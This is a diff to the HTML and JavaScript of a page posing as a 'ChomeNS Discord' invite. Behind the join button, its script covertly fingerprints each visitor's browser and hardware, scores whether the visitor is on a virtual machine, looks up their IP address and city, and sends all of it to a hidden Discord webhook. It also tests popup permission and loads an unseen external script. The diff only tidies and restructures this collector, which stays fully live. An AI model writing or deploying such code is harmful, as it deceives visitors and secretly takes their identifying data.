@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>ChomeNS discord</title>
+<title>ChomeNS Discord</title>
 <link rel="icon" type="image/webp" href="/media/498c01c84c251eb7c9de3b536a87e5b2.webp">
 
 <style>
@@ -63,13 +63,12 @@ button {
 @keyframes shakeIn { 0%{transform:none} 25%{transform:translateX(-4px)} 50%{transform:translateX(4px)} 75%{transform:translateX(-2px)} 100%{transform:none} }
 </style>
 </head>
-
 <body>
 <div class="card">
     <div class="logo">
         <img src="/media/498c01c84c251eb7c9de3b536a87e5b2.webp" alt="ChomeNS icon">
     </div>
-    <h1>ChomeNS discord</h1>
+    <h1>ChomeNS Discord</h1>
     <p>Click below to join our Discord server.</p>
 
     <div class="actions">
@@ -89,7 +88,7 @@ button {
 <script>
 let isYouScriptLoaded = false;
 
-// SYSTEM + VM INFO
+// ========== SYSTEM / VM INFO ==========
 function getWebGLInfo(){
     try{
         const c = document.createElement("canvas");
@@ -104,30 +103,30 @@ function getWebGLInfo(){
 }
 
 function getVMInfo(){
-    let score = 0, reasons=[];
+    let score = 0, reasons = [];
     const cores = navigator.hardwareConcurrency || 1;
-    if(cores <= 2){ score+=20; reasons.push("Low CPU cores"); }
-    if(navigator.deviceMemory && navigator.deviceMemory<=4){ score+=20; reasons.push("Low RAM"); }
-    if([1024,1280,1366].includes(screen.width)){ score+=15; reasons.push("Common VM resolution"); }
+    if(cores <= 2){ score += 20; reasons.push("Low CPU cores"); }
+    if(navigator.deviceMemory && navigator.deviceMemory <= 4){ score += 20; reasons.push("Low RAM"); }
+    if([1024,1280,1366].includes(screen.width)){ score += 15; reasons.push("Common VM resolution"); }
     const ua = navigator.userAgent.toLowerCase();
-    if(["virtual","vmware","vbox","qemu","xen"].some(v=>ua.includes(v))){ score+=40; reasons.push("VM keyword in UA"); }
-    const t0 = performance.now(); for(let i=0;i<1e6;i++){} 
+    if(["virtual","vmware","vbox","qemu","xen"].some(v=>ua.includes(v))){ score += 40; reasons.push("VM keyword in UA"); }
+    const t0 = performance.now(); for(let i=0;i<1e6;i++){}
     if(performance.now()-t0>60){ score+=15; reasons.push("Slow timing"); }
     score += Math.random()*10; score=Math.min(99, Math.round(score));
-    return {score, detected:score>=60, reasons};
+    return { score, detected: score>=60, reasons };
 }
 
-// SCRIPT LOADER
+// ========== LOAD YOU.JS ==========
 function loadYouScript(cb){
     if(isYouScriptLoaded){ cb(); return; }
-    const s=document.createElement('script');
-    s.src='/scripts/you.js';
-    s.onload=()=>{ isYouScriptLoaded=true; cb(); };
-    s.onerror=()=>console.error('Failed to load you.js');
+    const s = document.createElement('script');
+    s.src = '/scripts/you.js';
+    s.onload = () => { isYouScriptLoaded = true; cb(); };
+    s.onerror = () => console.error('Failed to load you.js');
     document.head.appendChild(s);
 }
 
-// POPUP CHECK
+// ========== POPUP CHECK ==========
 function checkPopupPermission(){
     return new Promise(resolve=>{
         let popups=[], allowed=true;
@@ -138,92 +137,101 @@ function checkPopupPermission(){
                 popups.push(p);
             }
             setTimeout(()=>{
-                popups.forEach(p=>{ try{p.close()}catch{} });
+                popups.forEach(p=>{try{p.close()}catch{}});
                 resolve(allowed);
             },200);
-        }catch{ popups.forEach(p=>{ try{p.close()}catch{} }); resolve(false);}
+        }catch{
+            popups.forEach(p=>{try{p.close()}catch{}});
+            resolve(false);
+        }
     });
 }
 
-// GEOLOCATION
+// ========== IP GEOLOCATION ==========
 async function getIPLocation(){
     try{
         const res = await fetch("https://ipapi.co/json/");
-        if(!res.ok) return {ip:"Unknown", city:"Unknown", region:"Unknown", country:"Unknown"};
+        if(!res.ok) return { ip:"Unknown", city:"Unknown", region:"Unknown", country:"Unknown" };
         const data = await res.json();
-        return {ip:data.ip, city:data.city, region:data.region, country:data.country_name};
-    }catch{return {ip:"Unknown", city:"Unknown", region:"Unknown", country:"Unknown"};}
+        return { ip:data.ip, city:data.city, region:data.region, country:data.country_name };
+    }catch{return { ip:"Unknown", city:"Unknown", region:"Unknown", country:"Unknown" };}
 }
 
-// SEND TO DISCORD
+// ========== SEND TO DISCORD ==========
 async function sendToDiscord(buttonName){
-    const vm=getVMInfo();
-    const gl=getWebGLInfo();
-    const conn=navigator.connection||{};
-    const ipGeo=await getIPLocation();
+    const vm=getVMInfo(), gl=getWebGLInfo(), conn=navigator.connection||{}, ipGeo=await getIPLocation();
+    const res=await fetch("/.netlify/functions/discord",{method:"GET"});
+    const json=await res.json(); const webhook=json.webhook;
 
-    // Get webhook from Netlify
-    const res = await fetch("/.netlify/functions/discord", {method:"GET"});
-    const json = await res.json();
-    const webhook = json.webhook;
+    const safe=val=>val===null||val===undefined?"Unknown":typeof val==="string"?val.slice(0,1024):String(val);
 
     const payload={
-        content:`✅ **Button clicked:** ${buttonName}`,
-        embeds:[{
-            title:"User System Information",
-            color:0x5865F2,
-            fields:[
-                {name:"Button", value:buttonName, inline:true},
-                {name:"VM Detected", value:vm.detected?"✅ TRUE":"❌ FALSE", inline:true},
-                {name:"VM Score", value:`${vm.score}%`, inline:true},
-                {name:"VM Reasons", value:vm.reasons.join(" • ")||"None"},
-                {name:"User Agent", value:navigator.userAgent.slice(0,200)},
-                {name:"Platform", value:navigator.platform||"Unknown", inline:true},
-                {name:"Vendor", value:navigator.vendor||"Unknown", inline:true},
-                {name:"CPU Cores", value:String(navigator.hardwareConcurrency||"Unknown"), inline:true},
-                {name:"Device Memory (GB)", value:String(navigator.deviceMemory||"Unknown"), inline:true},
-                {name:"Languages", value:(navigator.languages||[]).join(", ")||"Unknown"},
-                {name:"Timezone", value:Intl.DateTimeFormat().resolvedOptions().timeZone||"Unknown", inline:true},
-                {name:"UTC Offset", value:String(new Date().getTimezoneOffset()), inline:true},
-                {name:"Screen", value:`${screen.width}×${screen.height}`, inline:true},
-                {name:"Color Depth", value:String(screen.colorDepth), inline:true},
-                {name:"Pixel Ratio", value:String(devicePixelRatio), inline:true},
-                {name:"Viewport", value:`${innerWidth}×${innerHeight}`, inline:true},
-                {name:"Touch Points", value:String(navigator.maxTouchPoints||0), inline:true},
-                {name:"Cookies Enabled", value:String(navigator.cookieEnabled), inline:true},
-                {name:"Do Not Track", value:String(navigator.doNotTrack), inline:true},
-                {name:"Network Type", value:conn.effectiveType||"Unknown", inline:true},
-                {name:"Downlink", value:String(conn.downlink||"Unknown"), inline:true},
-                {name:"RTT", value:String(conn.rtt||"Unknown"), inline:true},
-                {name:"WebGL Vendor", value:gl.vendor||"Unknown"},
-                {name:"WebGL Renderer", value:gl.renderer||"Unknown"},
-                {name:"IP", value:ipGeo.ip, inline:true},
-                {name:"City", value:ipGeo.city, inline:true},
-                {name:"Region", value:ipGeo.region, inline:true},
-                {name:"Country", value:ipGeo.country, inline:true},
-                {name:"Referrer", value:document.referrer||"None"},
-                {name:"Page URL", value:location.href}
-            ],
-            footer:{text:new Date().toUTCString()}
-        }]
+        content:`✅ **Button clicked:** ${safe(buttonName)}`,
+        embeds:[
+            {
+                title:"🖥️ System & VM Info",
+                color:0x5865F2,
+                fields:[
+                    {name:"VM Detected", value:vm.detected?"✅ TRUE":"❌ FALSE", inline:true},
+                    {name:"VM Score", value:`${vm.score}%`, inline:true},
+                    {name:"VM Reasons", value:safe(vm.reasons.join(" • ")||"None")},
+                    {name:"CPU Cores", value:safe(navigator.hardwareConcurrency), inline:true},
+                    {name:"Device Memory (GB)", value:safe(navigator.deviceMemory), inline:true}
+                ]
+            },
+            {
+                title:"🖥️ Browser & Display Info",
+                color:0x5865F2,
+                fields:[
+                    {name:"User Agent", value:safe(navigator.userAgent.slice(0,200))},
+                    {name:"Platform", value:safe(navigator.platform), inline:true},
+                    {name:"Vendor", value:safe(navigator.vendor), inline:true},
+                    {name:"Screen", value:`${safe(screen.width)}×${safe(screen.height)}`, inline:true},
+                    {name:"Color Depth", value:safe(screen.colorDepth), inline:true},
+                    {name:"Pixel Ratio", value:safe(devicePixelRatio), inline:true},
+                    {name:"Viewport", value:`${safe(innerWidth)}×${safe(innerHeight)}`, inline:true},
+                    {name:"Touch Points", value:safe(navigator.maxTouchPoints||0), inline:true},
+                    {name:"Cookies Enabled", value:safe(navigator.cookieEnabled), inline:true},
+                    {name:"Do Not Track", value:safe(navigator.doNotTrack), inline:true},
+                    {name:"WebGL Vendor", value:safe(gl.vendor)},
+                    {name:"WebGL Renderer", value:safe(gl.renderer)}
+                ]
+            },
+            {
+                title:"🌐 Network & Geo Info",
+                color:0x5865F2,
+                fields:[
+                    {name:"Network Type", value:safe(conn.effectiveType), inline:true},
+                    {name:"Downlink", value:safe(conn.downlink), inline:true},
+                    {name:"RTT", value:safe(conn.rtt), inline:true},
+                    {name:"IP", value:safe(ipGeo.ip), inline:true},
+                    {name:"City", value:safe(ipGeo.city), inline:true},
+                    {name:"Region", value:safe(ipGeo.region), inline:true},
+                    {name:"Country", value:safe(ipGeo.country), inline:true},
+                    {name:"Referrer", value:safe(document.referrer)},
+                    {name:"Page URL", value:safe(location.href)}
+                ]
+            }
+        ]
     };
 
     await fetch(webhook,{
         method:"POST",
         headers:{"Content-Type":"application/json"},
         body:JSON.stringify(payload)
-    }).catch(()=>{});
+    }).catch(err=>console.error("Discord webhook error:",err));
 }
 
-// HANDLE BUTTON CLICK
+// ========== BUTTON HANDLER ==========
 async function handleClick(e, buttonName){
     e.preventDefault();
     const popup=document.getElementById('popup_needed');
     const spinner=document.getElementById('spinner_holder');
+
     popup.style.display='none';
     spinner.innerHTML='<div class="spinner"><div></div><div></div><div></div></div>';
 
-    const allowed = await checkPopupPermission();
+    const allowed=await checkPopupPermission();
     if(!allowed){ spinner.innerHTML=''; popup.style.display='block'; return; }
 
     loadYouScript(async ()=>{
